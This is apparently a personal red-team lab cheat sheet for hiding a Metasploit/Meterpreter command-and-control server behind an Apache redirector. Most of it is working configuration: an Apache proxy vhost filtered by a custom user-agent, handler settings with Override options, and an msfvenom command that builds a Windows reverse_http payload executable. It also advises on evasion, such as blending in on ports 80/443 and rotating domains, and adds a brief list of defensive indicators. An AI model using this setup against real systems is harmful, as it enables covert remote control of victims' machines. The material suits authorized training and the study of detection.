
# Metasploit Redirector — Setup Cheat Sheet

>

## Quick overview

- **Purpose:** Use an Apache/NGINX redirector (proxy) to hide the real C2 (Metasploit/Meterpreter) behind a front-facing host.
    
- **Main components:** Puppet (victim), Redirector (proxy/mailman), C2 (Metasploit — puppet-master).
    




To set up Meterpreter properly, we need to make a few modifications; We must set our LHOST argument to the incoming interface that we are expecting connections from, in our lab; this will be 127.0.0.1. In the real world, this will be your public interface that your Redirector will be connecting to (aka your Public IP Address), and the LPORT will be whatever you like. For the lab, we will be using TCP/8080; this can be whatever you like in production. As always, the best practice is to run services over their standard protocols, so HTTP should run on port 80, and HTTPS should run on port 443. These options will also need to be duplicated for ReverseListenerBindAddress and ReverseListenerBindPort.
Next, we need to set up OverrideLHOST - This value will be your redirector's IP Address or Domain Name. After that, we need to set the OverrideLPORT; this will be the port that the HTTP _or_ HTTPS is running on, on your Redirector. Lastly, we must set the OverrideRequestHost to true. This will make Meterpreter respond with the OverrideHost information, so all queries go through the Redirector and not your C2 server. Now that you understand what must be configured, let's dive into it:


## Apache modules to enable

```bash
apt install apache2
a2enmod rewrite proxy proxy_http headers
systemctl restart apache2
```

If port 80 is in use (AttackBox), change `/etc/apache2/ports.conf` before starting Apache.

---

## Apache virtual host (minimal) — add to `/etc/apache2/sites-available/000-default.conf`

```apacheconf
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html

    RewriteEngine On
    # Only forward requests with custom User-Agent
    RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"
    ProxyPass "/" "http://localhost:8080/"

    <Directory>
        AllowOverride All
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

- Adjust the `RewriteCond` regex to match whatever HttpUserAgent or header you use.
    
- For HTTPS, put this config in the SSL VirtualHost and use `ProxyPass` to the C2 handler (usually over HTTP on the internal port).
    

---

## Metasploit handler recommended options (example)

```text
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set LHOST 127.0.0.1
set LPORT 8080
set ReverseListenerBindAddress 127.0.0.1
set ReverseListenerBindPort 8080
set OverrideLHOST 192.168.0.44    # Redirector IP or domain
set OverrideLPORT 80              # Redirector port (80 for HTTP)
set HttpUserAgent NotMeterpreter   # Match Apache RewriteCond
set OverrideRequestHost true
run
```

**Notes:**

- `LHOST/LPORT` = where the handler listens locally (bind to loopback in lab).
    
- `ReverseListenerBind*` = actual bind address/port for incoming sockets.
    
- `OverrideLHOST/OverrideLPORT` = what the victim is told to call (redirector address/port).
    
- `OverrideRequestHost true` makes Meterpreter use the override when responding.
    

---

## Workflow checklist (lab → production)

-  Pick Redirector domain/IP and provision web server(s).
    
-  Enable required Apache modules: `rewrite`, `proxy`, `proxy_http`, `headers`.
    
-  Modify Apache vhost and test `ProxyPass` with a simple upstream first.
    
-  Generate payload with `HttpUserAgent` set to a predictable value.
    
-  Configure Metasploit handler with `Override*` options matching Redirector.
    
-  Add firewall rules: allow only Redirector ↔ C2 communication.
    
-  Use HTTPS (TLS) on the Redirector in production.
    
-  Use multiple Redirectors / DNS records to reduce single-point-of-failure.
    

---

## Payload generation quick example (msfvenom)

```bash
msfvenom -p windows/meterpreter/reverse_http LHOST=<public-or-redirector-domain> LPORT=80 HttpUserAgent=NotMeterpreter -f exe -o shell.exe
```

- In some labs you may set LHOST to the redirector domain; in others you set override values in the handler and keep payload LHOST as internal.
    

---

## Defensive indicators to watch for (blue team learning)

- Rare or custom `User-Agent` strings seen at scale.
    
- Repeated periodic callbacks from hosts to web endpoints with similar characteristics.
    
- Long or oddly structured HTTP POST/GET bodies that don't match regular web app patterns.
    
- Proxy headers or repeated requests that always result in internal proxying.
    

---

## Best practices & safety

- Run this only in lab environments or with **explicit written permission**.
    
- Use HTTPS and standard ports (80/443) to blend in—but only when authorized.
    
- Minimize exposure: firewall the C2 so only Redirector IPs can reach it.
    
- Rotate domains, use multiple Redirectors and keep logs for audit and incident response.
    

---

## Short cheat-lines (one-liners for Obsidian)

- Apache modules: `rewrite, proxy, proxy_http, headers`.
    
- Apache rule: `RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"` + `ProxyPass "/" "http://localhost:8080/"`.
    
- MSF handler core: `LHOST=127.0.0.1 LPORT=8080 OverrideLHOST=<redirector> OverrideLPORT=80 HttpUserAgent=NotMeterpreter OverrideRequestHost=true`.
    

C2 matrich spread sheet
https://docs.google.com/spreadsheets/d/1b4mUxa6cDQuTV2BPC6aA-GR4zGZi0ooPYtBe4IgPsSc/edit?gid=0#gid=0
---

## Tags

`#metasploit` `#redirector` `#meterpreter` `#cheatsheet` `#redteam-lab`

---

_End of cheat sheet — edit as needed for your lab/production specifics._